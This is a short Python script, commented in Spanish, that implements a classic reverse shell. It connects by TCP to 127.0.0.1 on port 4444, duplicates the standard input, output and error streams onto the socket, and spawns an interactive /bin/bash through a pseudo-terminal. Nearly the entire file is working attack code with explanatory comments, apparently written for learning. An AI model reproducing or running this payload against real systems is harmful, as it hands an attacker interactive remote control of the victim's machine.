import socket
import os
import pty 
# Sirve para manejar pseudo-terminales, emula un terminal real y ejecuta código de manera interactiva.

# Creamos la conexión con el host objetivo

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 'AF_INET' indica que usaremos IPv4 y 'SOCK_STREAM' indica que usaremos TCP
s.connect(("127.0.0.1", 4444)) # Conectamos al host objetivo en la IP y puerto especificados, en este caso localhost y puerto 4444

# Vamos a redirijir entrada de teclado, salida de texto y errores al socket para interactuar con el shell remoto
os.dup2(s.fileno(),0) # Redirige la entrada estándar (stdin) al socket
os.dup2(s.fileno(),1) # Redirige la salida estándar (stdout) al socket
os.dup2(s.fileno(),2) # Redirige la salida de errores estándar (stderr) al socket

# Creamos un pseudo-terminal para manejar la interacción con el shell
pty.spawn("/bin/bash") # Iniciamos una shell bash en el pseudo-terminal

# Lo anterior nos permitirá tener una shell interactiva a través de la conexión TCP establecida con el servidor.

